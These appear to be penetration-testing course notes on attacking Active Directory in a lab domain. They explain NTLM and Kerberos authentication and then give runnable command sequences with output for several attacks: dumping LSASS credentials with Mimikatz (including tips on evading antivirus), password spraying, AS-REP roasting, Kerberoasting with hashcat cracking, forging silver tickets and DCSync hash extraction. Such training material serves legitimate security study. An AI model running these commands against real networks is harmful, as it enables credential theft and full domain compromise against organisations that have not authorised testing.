# Attacking Active Directory

### NTLM Authentication

NTLM authentication is used when a client authenticates to a server by IP address (instead of by hostname), or if the user attempts to authenticate to a hostname that is not registered on the Active Directory-integrated DNS server. Likewise, third-party applications may choose to use NTLM authentication instead of Kerberos.

In the first step, the computer calculates a cryptographic hash, called the NTLM hash, from the user's password. Next, the client computer sends the username to the server, which returns a random value called the nonce or challenge. The client then encrypts the nonce using the NTLM hash, now known as a response, and sends it to the server.

The server forwards the response along with the username and the nonce to the domain controller. The validation is then performed by the domain controller, since it already knows the NTLM hash of all users. The domain controller encrypts the nonce itself with the NTLM hash of the supplied username and compares it to the response it received from the server. If the two are equal, the authentication request is successful.

### Kerberos Authentication

While NTLM authentication works via a challenge-and-response paradigm, Windows-based Kerberos authentication uses a ticket system.

A key difference between these two protocols (based on the underlying systems) is that with NTLM authentication, the client starts the authentication process with the application server itself, as discussed in the previous section. On the other hand, Kerberos client authentication involves the use of a domain controller in the role of a Key Distribution Center (KDC). The client starts the authentication process with the KDC and not the application server. A KDC service runs on each domain controller and is responsible for session tickets and temporary session keys to users and computers.

First, when a user logs in to their workstation, an Authentication Server Request (AS-REQ) is sent to the domain controller. The domain controller, acting as a KDC, also maintains the Authentication Server service. The AS-REQ contains a timestamp that is encrypted using a hash derived from the password of the user and their username.

When the domain controller receives the request, it looks up the password hash associated with the specific user in the ntds.dit file and attempts to decrypt the timestamp. If the decryption process is successful and the timestamp is not a duplicate, the authentication is considered successful.

Next, the domain controller replies to the client with an Authentication Server Reply (AS-REP). Since Kerberos is a stateless protocol, the AS-REP contains a session key and a Ticket Granting Ticket (TGT). The session key is encrypted using the user's password hash and may be decrypted by the client and then reused. The TGT contains information regarding the user, the domain, a timestamp, the IP address of the client, and the session key.

To avoid tampering, the TGT is encrypted by a secret key (NTLM hash of the krbtgt4 account) known only to the KDC and cannot be decrypted by the client. Once the client has received the session key and the TGT, the KDC considers the client authentication complete. By default, the TGT will be valid for ten hours, after which a renewal occurs. This renewal does not require the user to re-enter their password.

When the user wishes to access resources of the domain, such as a network share or a mailbox, it must again contact the KDC.

This time, the client constructs a Ticket Granting Service Request (TGS-REQ) packet that consists of the current user and a timestamp encrypted with the session key, the name of the resource, and the encrypted TGT.

Next, the ticket-granting service on the KDC receives the TGS-REQ, and if the resource exists in the domain, the TGT is decrypted using the secret key known only to the KDC. The session key is then extracted from the TGT and used to decrypt the username and timestamp of the request. At this point the KDC performs several checks:

    The TGT must have a valid timestamp.
    The username from the TGS-REQ has to match the username from the TGT.
    The client IP address needs to coincide with the TGT IP address.

If this verification process succeeds, the ticket-granting service responds to the client with a Ticket Granting Server Reply (TGS-REP). This packet contains three parts:

    The name of the service for which access has been granted.
    A session key to be used between the client and the service.
    A service ticket containing the username and group memberships along with the newly-created session key.

The service ticket's service name and session key are encrypted using the original session key associated with the creation of the TGT. The service ticket is encrypted using the password hash of the service account registered with the service in question.

Once the authentication process by the KDC is complete and the client has both a session key and a service ticket, the service authentication begins.

First, the client sends the application server an Application Request (AP-REQ), which includes the username and a timestamp encrypted with the session key associated with the service ticket along with the service ticket itself.

The application server decrypts the service ticket using the service account password hash and extracts the username and the session key. It then uses the latter to decrypt the username from the AP-REQ. If the AP-REQ username matches the one decrypted from the service ticket, the request is accepted. Before access is granted, the service inspects the supplied group memberships in the service ticket and assigns appropriate permissions to the user, after which the user may access the requested service.

### Cached AD Credentials

In modern versions of Windows, these hashes are stored in the Local Security Authority Subsystem Service (LSASS) memory space. Since the LSASS process is part of the operating system and runs as SYSTEM, we need SYSTEM (or local administrator) permissions to gain access to the hashes stored on a target. Because of this, we often have to start our attack with a local privilege escalation in order to retrieve the stored hashes. To make things even more tricky, the data structures used to store the hashes in memory are not publicly documented, and they are also encrypted with an LSASS-stored key.

In the following example, we will run Mimikatz as a standalone application. However, due to the mainstream popularity of Mimikatz and well-known detection signatures, consider avoiding using it as a standalone application and use methods discussed in the Antivirus Evasion Module instead. For example, execute Mimikatz directly from memory using an injector like PowerShell, or use a built-in tool like Task Manager to dump the entire LSASS process memory, move the dumped data to a helper machine, and then load the data into Mimikatz.

```bash
kali@kali:~$ xfreerdp /cert-ignore /u:jeff /d:corp.com /p:HenchmanPutridBonbon11 /v:192.168.50.75         
```

```bash
PS C:\Windows\system32> cd C:\Tools

PS C:\Tools\> .\mimikatz.exe
...

mimikatz # privilege::debug # engage the SeDebugPrivlege8 privilege, which will allow us to interact with a process owned by another account

mimikatz # sekurlsa::logonpasswords # Dump hashes for all users logged onto the current workspace or server, including remote logins
```

You can now try to crack the SHA-1 & NTLM hashes to extract user passwords. 

A different approach and use of Mimikatz is to exploit Kerberos authentication by abusing TGT and service tickets. As already discussed, we know that Kerberos TGT and service tickets for users currently logged on to the local machine are stored for future use. These tickets are also stored in LSASS, and we can use Mimikatz to interact with and retrieve our own tickets as well as the tickets of other local users.

Let's open a second PowerShell window and list the contents of the SMB share on WEB04 with UNC path \\web04.corp.com\backup. This will create and cache a service ticket.

```bash
PS C:\Users\jeff> dir \\web04.corp.com\backup
```

Once we've executed the directory listing on the SMB share, we can use Mimikatz to show the tickets that are stored in memory by entering sekurlsa::tickets.

```bash
mimikatz # sekurlsa::tickets
```

The output shows both a TGT and a TGS. Stealing a TGS would allow us to access only particular resources associated with those tickets. Alternatively, armed with a TGT, we could request a TGS for specific resources we want to target within the domain.

Before covering attacks on AD authentication mechanisms, let's briefly explore the use of Public Key Infrastructure (PKI) in AD. Microsoft provides the AD role Active Directory Certificate Services (AD CS) to implement a PKI, which exchanges digital certificates between authenticated users and trusted resources.

If a server is installed as a Certification Authority (CA), it can issue and revoke digital certificates (and much more). While a deep discussion on these concepts would require its own Module, let's focus on one aspect of cached and stored objects related to AD CS.

For example, we could issue certificates for web servers to use HTTPS or to authenticate users based on certificates from the CA via Smart Cards.

These certificates may be marked as having a non-exportable private key for security reasons. If so, a private key associated with a certificate cannot be exported even with administrative privileges. However, there are various methods to export the certificate with the private key.

We can rely again on Mimikatz to accomplish this. The crypto module contains the capability to either patch the CryptoAPI function with crypto::capi or KeyIso service with crypto::cng, making non-exportable keys exportable.

### Password Attacks

When performing a brute force or wordlist authentication attack, we must be aware of account lockouts. Too many failed logins may block the account for further attacks and possibly alert system administrators.

In the Module Active Directory Introduction and Enumeration, we used the DirectoryEntry constructor without arguments, but we can provide three arguments, including the LDAP path to the domain controller, the username, and the password:

```bash
PS C:\Users\jeff> $domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
  
PS C:\Users\jeff> $PDC = ($domainObj.PdcRoleOwner).Name

PS C:\Users\jeff> $SearchString = "LDAP://"

PS C:\Users\jeff> $SearchString += $PDC + "/"

PS C:\Users\jeff> $DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"

PS C:\Users\jeff> $SearchString += $DistinguishedName

PS C:\Users\jeff> New-Object System.DirectoryServices.DirectoryEntry($SearchString, "pete", "Nexus123!")
```

If the password for the user account is correct, the object creation will be successful.


```bash
distinguishedName : {DC=corp,DC=com}
Path              : LDAP://DC1.corp.com/DC=corp,DC=com
```

If not, you'll see something along the line of the following:

```bash
format-default : The following exception occurred while retrieving member "distinguishedName": "The user name or
password is incorrect.
"
    + CategoryInfo          : NotSpecified: (:) [format-default], ExtendedTypeSystemException
    + FullyQualifiedErrorId : CatchFromBaseGetMember,Microsoft.PowerShell.Commands.FormatDefaultCommand
```

We could use this technique to create a PowerShell script that enumerates all users and performs authentications according to the Lockout threshold and Lockout observation window.

The second kind of password spraying attack against AD users leverages SMB. This is one of the traditional approaches of password attacks in AD and comes with some drawbacks. For example, for every authentication attempt, a full SMB connection has to be set up and then terminated. As a result, this kind of password attack is very noisy due to the generated network traffic. It is also quite slow in comparison to other techniques.

We'll select smb as protocol and enter the IP address of any domain joined system such as CLIENT75 (192.168.50.75). Then, we can provide a list or single users and passwords to -u and -p. In addition, we will enter the domain name for -d and provide the option --continue-on-success to avoid stopping at the first valid credential. For the purposes of this example, we'll create a text file named users.txt containing a subset of the domain usernames dave, jen, and pete to spray the password Nexus123! against.

```bash
kali@kali:~$ cat users.txt
dave
jen
pete

kali@kali:~$ crackmapexec smb 192.168.50.75 -u users.txt -p 'Nexus123!' -d corp.com --continue-on-success
SMB         192.168.50.75   445    CLIENT75         [*] Windows 10.0 Build 22000 x64 (name:CLIENT75) (domain:corp.com) (signing:False) (SMBv1:False)
SMB         192.168.50.75   445    CLIENT75         [-] corp.com\dave:Nexus123! STATUS_LOGON_FAILURE 
SMB         192.168.50.75   445    CLIENT75         [+] corp.com\jen:Nexus123!
SMB         192.168.50.75   445    CLIENT75         [+] corp.com\pete:Nexus123!
```

We should note that crackmapexec doesn't examine the password policy of the domain before starting the password spraying. As a result, we should be cautious about locking out user accounts with this method.

As a bonus, however, the output of crackmapexec not only displays if credentials are valid, but also if the user with the identified credentials has administrative privileges on the target system by appending "Pwn3d!" to the output. 

The third kind of password spraying attack we'll discuss is based on obtaining a TGT. For example, using kinit on a Linux system, we can obtain and cache a Kerberos TGT. We'll need to provide a username and password to do this. If the credentials are valid, we'll obtain a TGT. The advantage of this technique is that it only uses two UDP frames to determine whether the password is valid, as it sends only an AS-REQ and examines the response.

We could use Bash scripting or a programming language of our choice to automate this method. Fortunately, we can also use the tool **kerbrute**, implementing this technique to spray passwords. Since this tool is cross-platform, we can use it on Windows and Linux.

To conduct password spraying, we need to specify the passwordspray command along with a list of usernames and the password to spray. We'll also need to enter the domain corp.com as an argument for -d. As previously, we'll create a file named usernames.txt in C:\Tools containing the usernames pete, dave, and jen.

```bash
PS C:\Tools> type .\usernames.txt
pete
dave
jen

PS C:\Tools> .\kerbrute_windows_amd64.exe passwordspray -d corp.com .\usernames.txt "Nexus123!"

    __             __               __
   / /_____  _____/ /_  _______  __/ /____
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/

Version: v1.0.3 (9dad6e1) - 09/06/22 - Ronnie Flathers @ropnop

2022/09/06 20:30:48 >  Using KDC(s):
2022/09/06 20:30:48 >   dc1.corp.com:88
2022/09/06 20:30:48 >  [+] VALID LOGIN:  jen@corp.com:Nexus123!
2022/09/06 20:30:48 >  [+] VALID LOGIN:  pete@corp.com:Nexus123!
2022/09/06 20:30:48 >  Done! Tested 3 logins (2 successes) in 0.041 seconds
```

If you receive a network error, make sure that the encoding of usernames.txt is ANSI. You can use Notepad's Save As functionality to change the encoding.

### AS-REP Roasting

As we have discussed, the first step of the authentication process via Kerberos is to send an AS-REQ. Based on this request, the domain controller can validate if the authentication is successful. If it is, the domain controller replies with an AS-REP containing the session key and TGT. This step is also commonly referred to as Kerberos preauthentication and prevents offline password guessing.

By default, the AD user account option, Do not require Kerberos preauthentication, is disabled, meaning that Kerberos preauthentication is performed for all users. However, it is possible to enable this account option manually. In assessments, we may find accounts with this option enabled as some applications and technologies require it to function properly.

On Kali, we can use impacket-GetNPUsers to perform AS-REP roasting. We'll need to enter the IP address of the domain controller as an argument for -dc-ip, the name of the output file in which the AS-REP hash will be stored in Hashcat format for -outputfile, and -request to request the TGT.

```bash
kali@kali:~$ impacket-GetNPUsers -dc-ip 192.168.50.70  -request -outputfile hashes.asreproast corp.com/pete
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

Password:
Name  MemberOf  PasswordLastSet             LastLogon                   UAC      
----  --------  --------------------------  --------------------------  --------
dave            2022-09-02 19:21:17.285464  2022-09-07 12:45:15.559299  0x410200
```

If you use the above the command above without the -request and -outputfile options, you will see who you are able to perform AS-REP Roasting against.

Dave has the user account option Do not require Kerberos preauthentication enabled, meaning it's vulnerable to AS-REP Roasting. By default, the resulting hash format of impacket-GetNPUsers is compatible with Hashcat. Therefore, let's check the correct mode for the AS-REP hash by grepping for "Kerberos" in the Hashcat help.

```bash
kali@kali:~$ hashcat --help | grep -i "Kerberos"
```

Let's enter the mode 18200, the file containing the AS-REP hash, rockyou.txt as wordlist, best64.rule as rule file, and --force to perform the cracking on our Kali VM.

```bash
kali@kali:~$ sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```

As mentioned, we can also perform AS-REP Roasting on Windows using Rubeus. Since we're performing this attack as a pre-authenticated domain user, we don't have to provide any other options to Rubeus except asreproast. Rubeus will automatically identify vulnerable user accounts. We also add the flag /nowrap to prevent new lines being added to the resulting AS-REP hashes.

```bash
PS C:\Tools> .\Rubeus.exe asreproast /nowrap

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.1.2


[*] Action: AS-REP roasting

[*] Target Domain          : corp.com

[*] Searching path 'LDAP://DC1.corp.com/DC=corp,DC=com' for '(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304))'
[*] SamAccountName         : dave
[*] DistinguishedName      : CN=dave,CN=Users,DC=corp,DC=com
[*] Using domain controller: DC1.corp.com (192.168.50.70)
[*] Building AS-REQ (w/o preauth) for: 'corp.com\dave'
[+] AS-REQ w/o preauth successful!
[*] AS-REP hash:

      $krb5asrep$dave@corp.com:AE43CA9011CC7E7B9E7F7E7279DD7F2E$7D4C59410DE2984EDF35053B7954E6DC9A0D16CB5BE8E9DCACCA88C3C13C4031ABD71DA16F476EB972506B4989E9ABA2899C042E66792F33B119FAB1837D94EB654883C6C3F2DB6D4A8D44A8D9531C2661BDA4DD231FA985D7003E91F804ECF5FFC0743333959470341032B146AB1DC9BD6B5E3F1C41BB02436D7181727D0C6444D250E255B7261370BC8D4D418C242ABAE9A83C8908387A12D91B40B39848222F72C61DED5349D984FFC6D2A06A3A5BC19DDFF8A17EF5A22162BAADE9CA8E48DD2E87BB7A7AE0DBFE225D1E4A778408B4933A254C30460E4190C02588FBADED757AA87A
```

Rubeus identified dave as vulnerable to AS-REP Roasting and displays the AS-REP hash.

Next, let's copy the AS-REP hash and paste it into a text file named hashes.asreproast2 in the home directory of user kali. We can now start Hashcat again to crack the AS-REP hash.

```bash
kali@kali:~$ sudo hashcat -m 18200 hashes.asreproast2 /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```

Let's assume that we are conducting an assessment in which we cannot identify any AD users with the account option Do not require Kerberos preauthentication enabled. While enumerating, we notice that we have GenericWrite or GenericAll permissions on another AD user account. Using these permissions, we could reset their passwords, but this would lock out the user from accessing the account. We could also leverage these permissions to modify the User Account Control value of the user to not require Kerberos preauthentication. This attack is known as Targeted AS-REP Roasting. Notably, we should reset the User Account Control value of the user once we've obtained the hash.

### Kerberoasting

When requesting the service ticket from the domain controller, no checks are performed to confirm whether the user has any permissions to access the service hosted by the SPN.

These checks are performed as a second step only when connecting to the service itself. This means that if we know the SPN we want to target, we can request a service ticket for it from the domain controller.

The service ticket is encrypted using the SPN's password hash. If we are able to request the ticket and decrypt it using brute force or guessing, we can use this information to crack the cleartext password of the service account. This technique is known as Kerberoasting.

To perform Kerberoasting, we'll use Rubeus again. We specify the kerberoast command to launch this attack technique. In addition, we'll provide hashes.kerberoast as an argument for /outfile to store the resulting TGS-REP hash in. Since we'll execute Rubeus as an authenticated domain user, the tool will identify all SPNs linked with a domain user.

```bash
PS C:\Tools> .\Rubeus.exe kerberoast /outfile:hashes.kerberoast
```

```bash
kali@kali:~$ cat hashes.kerberoast
$krb5tgs$23$*iis_service$corp.com$HTTP/web04.corp.com:80@corp.com*$940AD9DCF5DD5CD8E91A86D4BA0396DB$F57066A4F4F8FF5D70DF39B0C98ED7948A5DB08D689B92446E600B49FD502DEA39A8ED3B0B766E5CD40410464263557BC0E4025BFB92D89BA5C12C26C72232905DEC4D060D3C8988945419AB4A7E7ADEC407D22BF6871D...
...

kali@kali:~$ hashcat --help | grep -i "Kerberos"         
...
kali@kali:~$ sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```

Next, let's perform Kerberoasting from Linux. We can use impacket-GetUserSPNs2 with the IP of the domain controller as the argument for -dc-ip. Since our Kali machine is not joined to the domain, we also have to provide domain user credentials to obtain the TGS-REP hash. As before, we can use -request to obtain the TGS and output them in a compatible format for Hashcat.

```bash
kali@kali:~$ sudo impacket-GetUserSPNs -request -dc-ip 192.168.50.70 corp.com/pete
```

If impacket-GetUserSPNs throws the error "KRB_AP_ERR_SKEW(Clock skew too great)," we need to synchronize the time of the Kali machine with the domain controller. We can use ntpdate3 or rdate4 to do so.

Now, let's store the TGS-REP hash in a file named hashes.kerberoast2 and crack it with Hashcat as we did before.

```bash
kali@kali:~$ sudo hashcat -m 13100 hashes.kerberoast2 /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```

This technique is immensely powerful if the domain contains high-privilege service accounts with weak passwords, which is not uncommon in many organizations. However, if the SPN runs in the context of a computer account, a managed service account, or a group-managed service account, the password will be randomly generated, complex, and 120 characters long, making cracking infeasible. The same is true for the krbtgt user account which acts as service account for the KDC. Therefore, our chances of performing a successful Kerberoast attack against SPNs running in the context of user accounts is much higher.

Let's assume that we are performing an assessment and notice that we have GenericWrite or GenericAll permissions on another AD user account. As stated before, we could reset the user's password but this may raise suspicion. However, we could also set an SPN for the user, kerberoast the account, and crack the password hash in an attack named targeted Kerberoasting. We'll note that in an assessment, we should delete the SPN once we've obtained the hash to avoid adding any potential vulnerabilities to the client's infrastructure.

### Silver Tickets

Remembering the inner workings of the Kerberos authentication, the application on the server executing in the context of the service account checks the user's permissions from the group memberships included in the service ticket. However, the user and group permissions in the service ticket are not verified by the application in a majority of environments. In this case, the application blindly trusts the integrity of the service ticket since it is encrypted with a password hash that is, in theory, only known to the service account and the domain controller.

Privileged Account Certificate (PAC) validation is an optional verification process between the SPN application and the domain controller. If this is enabled, the user authenticating to the service and its privileges are validated by the domain controller. Fortunately for this attack technique, service applications rarely perform PAC validation.

As an example, if we authenticate against an IIS server that is executing in the context of the service account iis_service, the IIS application will determine which permissions we have on the IIS server depending on the group memberships present in the service ticket.

With the service account password or its associated NTLM hash at hand, we can forge our own service ticket to access the target resource (in our example, the IIS application) with any permissions we desire. This custom-created ticket is known as a silver ticket and if the service principal name is used on multiple servers, the silver ticket can be leveraged against them all.

**In general, we need to collect the following three pieces of information to create a silver ticket:
    SPN password hash
    Domain SID
    Target SPN**

First, let's confirm that our current user has no access to the resource of the HTTP SPN mapped to iis_service. To do so, we'll use iwr and enter -UseDefaultCredentials so that the credentials of the current user are used to send the web request.

```bash
PS C:\Users\jeff> iwr -UseDefaultCredentials http://web04
```

Let's start collecting the information needed to forge a silver ticket.

Since we are a local Administrator on this machine where iis_service has an established session, we can use Mimikatz to retrieve the SPN password hash (NTLM hash of iis_service), which is the first piece of information we need to create a silver ticket.

```bash
mimikatz # privilege::debug

mimikatz # sekurlsa::logonpasswords # Looking for NTLM hash
```



Now, let's obtain the domain SID, the second piece of information we need. We can enter whoami /user to get the SID of the current user. Alternatively, we could also retrieve the SID of the SPN user account from the output of Mimikatz, since the domain user accounts exist in the same domain.

As covered in the Windows Privilege Escalation Module, the SID consists of several parts. Since we're only interested in the Domain SID, we'll omit the RID of the user.

```bash
PS C:\Users\jeff> whoami /user # Looking for SID

USER INFORMATION
----------------

User Name SID
========= =============================================
corp\jeff S-1-5-21-1987370270-658905905-1781884369-1105
```

The last list item is the target SPN. For this example, we'll target the HTTP SPN resource on WEB04 (HTTP/web04.corp.com:80) because we want to access the web page running on IIS.

Now that we have collected all three pieces of information, we can build the command to create a silver ticket with Mimikatz. We can create the forged service ticket with the kerberos::golden module. This module provides the capabilities for creating golden and silver tickets alike.

We need to provide the domain SID (/sid:), domain name (/domain:), and the target where the SPN runs (/target:). We also need to include the SPN protocol (/service:), NTLM hash of the SPN (/rc4:), and the /ptt option, which allows us to inject the forged ticket into the memory of the machine we execute the command on.

```bash
mimikatz # kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com /ptt /target:web04.corp.com /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:jeffadmin
...
mimikatz # exit
```

A new service ticket for the SPN HTTP/web04.corp.com has been loaded into memory and Mimikatz set appropriate group membership permissions in the forged ticket. From the perspective of the IIS application, the current user will be both the built-in local administrator ( Relative Id: 500 ) and a member of several highly-privileged groups, including the Domain Admins group ( Relative Id: 512 ).

This means we should have the ticket ready to use in memory. We can confirm this with klist.

```bash
PS C:\Tools> klist

Current LogonId is 0:0xa04cc

Cached Tickets: (1)

#0>     Client: jeffadmin @ corp.com
        Server: http/web04.corp.com @ corp.com
        KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
        Ticket Flags 0x40a00000 -> forwardable renewable pre_authent
        Start Time: 9/14/2022 4:37:32 (local)
        End Time:   9/11/2032 4:37:32 (local)
        Renew Time: 9/11/2032 4:37:32 (local)
        Session Key Type: RSADSI RC4-HMAC(NT)
        Cache Flags: 0
        Kdc Called:
```

Let's verify our access using the same command as before:

```bash
PS C:\Tools> iwr -UseDefaultCredentials http://web04
```

It's worth noting that we performed this attack without access to the plaintext password or password hash of this user.

Once we have access to the password hash of the SPN, a machine account, or user, we can forge the related service tickets for any users and permissions. This is a great way of accessing SPNs in later phases of a penetration test, as we need privileged access in most situations to retrieve the password hash of the SPN.

Since silver and golden tickets represent powerful attack techniques, Microsoft created a security patch to update the PAC structure. With this patch in place, the extended PAC structure field PAC_REQUESTOR needs to be validated by a domain controller. This mitigates the capability to forge tickets for non-existent domain users if the client and the KDC are in the same domain. 

### Domain Controller Synchronization

In production environments, domains typically rely on more than one domain controller to provide redundancy. The Directory Replication Service (DRS) Remote Protocol1 uses replication to synchronize these redundant domain controllers. A domain controller may request an update for a specific object, like an account, using the IDL_DRSGetNCChanges3 API.

Luckily for us, the domain controller receiving a request for an update does not check whether the request came from a known domain controller. Instead, it only verifies that the associated SID has appropriate privileges. If we attempt to issue a rogue update request to a domain controller from a user with certain rights it will succeed.

To launch such a replication, a user needs to have the Replicating Directory Changes, Replicating Directory Changes All, and Replicating Directory Changes in Filtered Set rights. By default, members of the Domain Admins, Enterprise Admins, and Administrators groups have these rights assigned.

If we obtain access to a user account in one of these groups or with these rights assigned, we can perform a dcsync4 attack in which we impersonate a domain controller. This allows us to request any user credentials from the domain.

```bash
PS C:\Tools> .\mimikatz.exe
...

mimikatz # lsadump::dcsync /user:corp\dave # Looking for "Hash NTLM"
```

Now, let's copy the NTLM hash and store it in a file named hashes.dcsync on our Kali system. We can then crack the hash using Hashcat as we learned in the Password Attacks Module. We'll enter 1000 as mode, rockyou.txt as wordlist, and best64.rule as rule file. Additionally, we will enter the file containing the NTLM hash and --force, since we run Hashcat in a VM.

```bash
kali@kali:~$ hashcat -m 1000 hashes.dcsync /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```

Once we've cracked the this hash, we can obtain the NTLM hash of any domain user account of the domain corp.com. Furthermore, we can attempt to crack these hashes and retrieve the plaintext passwords of these accounts.

```bash
mimikatz # lsadump::dcsync /user:corp\Administrator
...
Credentials:
  Hash NTLM: 2892d26cdf84d7a70e2eb3b9f05c425e
...
```

We'll discuss lateral movement vectors such as leveraging NTLM hashes obtained by dcsync in the Module Lateral Movement in Active Directory.

For now, let's perform the dcsync attack from Linux as well. We'll use impacket-secretsdump to acheive this. To launch it, we'll enter the target username dave as an argument for -just-dc-user and provide the credentials of a user with the required rights, as well as the IP of the domain controller in the format domain/user:password@ip.

```bash
kali@kali:~$ impacket-secretsdump -just-dc-user dave corp.com/jeffadmin:"BrouhahaTungPerorateBroom2023\!"@192.168.50.70
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
dave:1103aad3b435b51404eeaad3b435b51404ee::********08d7a47a6f9f66b97b1bae4178747494******:::
...
```

The dcsync attack is a powerful technique to obtain any domain user credentials. As a bonus, we can use it from both Windows and Linux. By impersonating a domain controller, we can use replication to obtain user credentials from a domain controller. However, to perform this attack, we need a user that is a member of Domain Admins, Enterprise Admins, or Administrators, because there are certain rights required to start the replication. Alternatively, we can leverage a user with these rights assigned, though we're far less likely to encounter one of these in a real penetration test.